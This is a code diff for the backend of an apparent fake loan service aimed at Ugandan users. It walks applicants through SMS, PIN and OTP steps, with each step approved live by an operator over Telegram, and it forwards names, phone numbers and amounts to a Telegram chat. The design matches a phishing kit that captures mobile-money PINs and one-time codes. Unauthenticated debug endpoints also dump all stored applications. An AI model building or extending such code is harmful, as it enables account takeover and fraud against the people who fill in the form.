@@ -625,4 +625,162 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
                 const statusKey = step.toLowerCase() + 'Status';
                 if (step === 'SMS' && app.smsStatus === 'pending') app.smsStatus = action === 'YES' ? 'approved' : 'rejected';
-                else if (step === 'PIN' && app.pinStatus === 'pending') app.pinStatus = action === '
+                else if (step === 'PIN' && app.pinStatus === 'pending') app.pinStatus = action === 'YES' ? 'approved' : 'rejected';
+                else if (step === 'OTP' && app.otpStatus === 'pending') app.otpStatus = action === 'YES' ? 'approved' : 'rejected';
+                else console.log(`⚠️ Status not updated. Current: ${app[statusKey]}`);
+
+                app.updatedAt = new Date().toISOString();
+                saveApplications();
+
+                await answerCallback(query.id, `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`);
+                answered = true;
+
+                const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
+                await sendTelegramMessage(`📌 *Status Update (UGANDA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${escapeMd(applicationId)}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
+            } catch (parseError) {
+                console.error('❌ Error parsing callback data:', parseError.message);
+                if (!answered) {
+                    try { await answerCallback(query.id, '⚠️ Error processing action'); } catch (_) {}
+                }
+            }
+            return res.sendStatus(200);
+        }
+
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('❌ Webhook error:', error);
+        res.sendStatus(500);
+    }
+});
+
+// ─── 12. Status Check ───
+app.get('/api/status/:applicationId/:step', (req, res) => {
+    try {
+        const app = getApp(req.params.applicationId);
+        if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
+
+        clearExpiredPinBlock(app);
+
+        let status = 'pending';
+        if (req.params.step === 'sms') status = app.smsStatus;
+        else if (req.params.step === 'pin') status = app.pinStatus;
+        else if (req.params.step === 'otp') status = app.otpStatus;
+
+        res.json({
+            ok: true,
+            status,
+            rejectionInfo: rejectionHistory[req.params.applicationId] || null,
+            resubmissionCount: app.resubmissionCount || 0
+        });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── 13. Debug ───
+app.get('/api/debug/applications', (req, res) => {
+    res.json({
+        total: Object.keys(applications).length,
+        applications,
+        rejections: rejectionHistory,
+        dataFile: fs.existsSync(DATA_FILE) ? 'exists' : 'not found'
+    });
+});
+
+app.get('/api/debug/application/:id', (req, res) => {
+    const app = getApp(req.params.id);
+    if (!app) return res.status(404).json({ error: 'Application not found' });
+    res.json(app);
+});
+
+// ─── TEMP diagnostic (remove after verifying) ───
+app.get('/api/debug/telegram-test', async (req, res) => {
+    const results = {};
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/getMe`);
+        results.getMe = await r.json();
+    } catch (e) { results.getMe = { error: e.message, code: e.code }; }
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/getChat?chat_id=${TELEGRAM_CHAT_ID}`);
+        results.getChat = await r.json();
+    } catch (e) { results.getChat = { error: e.message, code: e.code }; }
+    try {
+        const r = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: '🧪 Diagnostic ping (Uganda) — sending works.' })
+        });
+        results.sendMessage = await r.json();
+    } catch (e) { results.sendMessage = { error: e.message, code: e.code }; }
+    res.json(results);
+});
+
+// ─── 14. Backup ───
+app.get('/api/debug/backup', (req, res) => {
+    try {
+        const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
+        atomicWrite(backupFile, JSON.stringify({ applications, rejectionHistory, timestamp: new Date().toISOString() }, null, 2));
+        res.json({ ok: true, message: 'Backup created', file: backupFile });
+    } catch (error) {
+        res.status(500).json({ ok: false, error: error.message });
+    }
+});
+
+// ─── Serve frontend ───
+app.get('*', (req, res) => {
+    if (req.path.startsWith('/api/')) return res.status(404).json({ ok: false, error: 'Endpoint not found' });
+    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
+});
+
+// ─── Listen ───
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📁 Frontend: ${path.join(__dirname, '../frontend')}`);
+    console.log(`💾 Data: ${DATA_DIR}`);
+
+    if (PUBLIC_URL && TELEGRAM_WEBHOOK_SECRET) {
+        const webhookUrl = `${PUBLIC_URL.replace(/\/$/, '')}/api/telegram-webhook`;
+        tgFetch('setWebhook', { url: webhookUrl, secret_token: TELEGRAM_WEBHOOK_SECRET, drop_pending_updates: false }, { retries: 2 })
+            .then(r => console.log('🔗 setWebhook:', r.ok ? '✅ registered' : `❌ ${r.description || r.error}`))
+            .catch(e => console.error('setWebhook error:', e.message));
+    } else if (PUBLIC_URL) {
+        console.warn('⚠️ PUBLIC_URL set but TELEGRAM_WEBHOOK_SECRET missing — skipping auto-register');
+    }
+
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        setTimeout(async () => {
+            const r = await tgFetch('getMe', {}, { retries: 2 });
+            console.log('🔥 Warm-up getMe:', r.ok ? '✅' : `❌ ${r.description || r.error}`);
+        }, 2000);
+    }
+});
+
+// ─── Background sweeper for failed notifications ───
+setInterval(async () => {
+    for (const [id, app] of Object.entries(applications)) {
+        if (app.smsStatus === 'pending' && !app.notifiedAt) {
+            const age = Date.now() - new Date(app.updatedAt).getTime();
+            if (age > 60000) {
+                console.log(`🔁 Re-notifying admin about ${id}`);
+                const tg = await sendTelegramMessage(
+                    `⏰ *REMINDER — PENDING APPLICATION (UGANDA)*\n🆔 ${escapeMd(id)}\n👤 ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 +256${escapeMd(app.phone)}\n💰 UGX ${Number(app.loanAmount || 0).toLocaleString()}`,
+                    [[
+                        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId: id }) },
+                        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId: id }) }
+                    ]]
+                );
+                if (tg.ok) { app.notifiedAt = new Date().toISOString(); saveApplications(); }
+            }
+        }
+    }
+}, 30000);
+
+// ─── Self-ping (fights free-tier spin-down) ───
+if (PUBLIC_URL) {
+    const pingUrl = `${PUBLIC_URL.replace(/\/$/, '')}/health`;
+    setInterval(() => {
+        fetch(pingUrl, { method: 'GET' })
+            .then(r => console.log(`🫀 self-ping ${r.status}`))
+            .catch(e => console.warn(`🫀 self-ping failed: ${e.message}`));
+    }, 10 * 60 * 1000);
+}
